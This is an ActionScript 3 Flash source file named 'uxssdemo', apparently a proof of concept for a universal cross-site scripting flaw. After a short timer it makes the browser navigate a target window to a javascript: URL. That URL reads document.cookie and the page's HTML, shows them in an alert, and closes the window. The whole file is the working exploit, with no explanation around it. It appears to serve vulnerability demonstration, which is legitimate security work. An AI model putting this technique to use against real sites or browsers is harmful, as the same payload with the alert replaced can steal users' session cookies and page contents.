package {
  import flash.display.Sprite;
  import flash.net.*;
  import flash.utils.*;

  public class uxssdemo extends Sprite {
    public function uxssdemo() {
      setTimeout(DoAttack, 1000);
    }

    public function DoAttack():void {
      var request:URLRequest =
          new URLRequest('javascript:alert("Cookie: "+document.cookie+"\\n\\nContent: \\n\\n" + document.lastChild.innerHTML);window.close();');
      navigateToURL(request, 'tg');
    }
  }
}

